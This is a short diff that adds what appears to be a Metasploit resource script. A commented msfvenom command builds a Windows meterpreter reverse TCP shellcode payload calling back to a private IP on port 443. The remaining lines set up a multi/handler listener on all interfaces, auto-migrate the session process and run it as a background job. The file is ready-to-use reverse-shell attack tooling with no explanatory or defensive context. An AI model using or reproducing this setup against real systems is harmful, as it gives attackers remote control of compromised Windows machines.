@@ -1,0 +1,10 @@
+#msfvenom -p windows/meterpreter_reverse_tcp LHOST=192.168.0.217 LPORT=443 -a x86 -f c 2>/dev/null | egrep "^\"" | tr -d "\"\n;" >met.mf
+use exploit/multi/handler
+set payload windows/meterpreter_reverse_tcp
+set LPORT 443
+set LHOST 0.0.0.0
+set ReverseListenerBindAddress 0.0.0.0
+set AutoRunScript migrate -f
+#set AutoRunScript post/windows/manage/smart_migrate
+show options 
+run -j
